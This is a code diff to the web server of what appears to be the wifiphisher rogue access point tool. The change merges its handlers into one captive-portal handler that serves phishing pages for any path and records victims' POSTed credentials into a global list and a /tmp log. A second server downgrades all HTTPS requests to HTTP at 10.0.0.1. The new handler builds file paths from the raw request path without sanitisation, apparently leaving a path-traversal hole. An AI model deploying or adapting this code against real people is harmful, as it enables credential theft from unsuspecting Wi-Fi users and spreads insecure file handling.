@@ -1,6 +1,6 @@
-#pylint: skip-file
 import tornado.ioloop
 import tornado.web
+import os.path
 import logging
 hn = logging.NullHandler()
 hn.setLevel(logging.DEBUG)
@@ -15,49 +15,61 @@ creds = []
 
 class DowngradeToHTTP(tornado.web.RequestHandler):
 
-    def get(self, url):
+    def get(self):
         self.redirect("http://10.0.0.1:8080/")
 
 
-class ShowPhishingPageHandler(tornado.web.RequestHandler):
-
-    def get(self, url):
-        try:
-            if "/" in url:
-                self.redirect("/index")
-            self.render("index.html", **template.get_context())
-            wifi_webserver_tmp = "/tmp/wifiphisher-webserver.tmp"
-            with open(wifi_webserver_tmp, "a+") as log_file:
-                log_file.write('[' + T + '*' + W + '] ' + O + "GET" + W + " request from " + T +
-                               self.request.remote_ip + W + " for " + self.request.full_url() +
-                               "\n")
-                log_file.close()
-        # Ignore weird requests
-        except:
-            pass
-
-
-class ReceiveCredsHandler(tornado.web.RequestHandler):
-
-    def post(self):
-        self.redirect("/loading")
-        wifi_webserver_tmp = "/tmp/wifiphisher-webserver.tmp"
-        with open(wifi_webserver_tmp, "a+") as log_file:
-            log_file.write('[' + T + '*' + W + '] ' + O + "POST " +
-                           T + self.request.remote_ip + " " +
-                           R + repr(self.request.body) +
-                           W + "\n"
-                           )
-            log_file.close()
-        global terminate, creds
-        creds.insert(0, repr(tornado.escape.url_unescape(self.request.body)))
-        terminate = True
-
-
-class ShowLoadingPageHandler(tornado.web.RequestHandler):
+class CaptivePortalHandler(tornado.web.RequestHandler):
 
     def get(self):
-        self.render("loading.html", **template.get_context())
+        """
+        Override the get method
+
+        :param self: A tornado.web.RequestHandler object
+        :type self: tornado.web.RequestHandler
+        :return: None
+        :rtype: None
+        """
+
+        requested_file = self.request.path[1:]
+        template_directory = template.get_path()
+
+        # choose the correct file to serve
+        if os.path.isfile(template_directory + requested_file):
+            render_file = requested_file
+        else:
+            render_file = "index.html"
+
+        # load the file
+        file_path = template_directory + render_file
+        self.render(file_path, **template.get_context())
+
+        log_file_path = "/tmp/wifiphisher-webserver.tmp"
+        with open(log_file_path, "a+") as log_file:
+            log_file.write("[{0}*{1}]{2} GET {1} request from {0}{3}{1} for {0}{4}{1}\n".format(
+                T, W, O, self.request.remote_ip, self.request.full_url()))
+
+    def post(self):
+        """
+        Override the post method
+
+        :param self: A tornado.web.RequestHandler object
+        :type self: tornado.web.RequestHandler
+        :return: None
+        :rtype: None
+        """
+
+        global terminate
+        post_data = tornado.escape.url_unescape(self.request.body)
+
+        # log the data
+        log_file_path = "/tmp/wifiphisher-webserver.tmp"
+        with open(log_file_path, "a+") as log_file:
+            log_file.write("[{0}*{1}] {2}POST{1} request from {0}{3}{1} with {0}{4}{1}\n".format(
+                T, W, O, self.request.remote_ip, post_data))
+
+        creds.append(post_data)
+        terminate = True
 
 
 def runHTTPServer(ip, port, ssl_port, t):
@@ -65,9 +77,7 @@ def runHTTPServer(ip, port, ssl_port, t):
     template = t
     app = tornado.web.Application(
         [
-            (r"/post", ReceiveCredsHandler),
-            (r"/loading", ShowLoadingPageHandler),
-            (r"/(.*)", ShowPhishingPageHandler)
+            (r"/.*", CaptivePortalHandler)
         ],
         template_path=template.get_path(),
         static_path=template.get_path_static(),
@@ -77,7 +87,7 @@ def runHTTPServer(ip, port, ssl_port, t):
 
     ssl_app = tornado.web.Application(
         [
-            (r"/(.*)", DowngradeToHTTP)
+            (r"/.*", DowngradeToHTTP)
         ]
     )
     https_server = tornado.httpserver.HTTPServer(ssl_app, ssl_options={
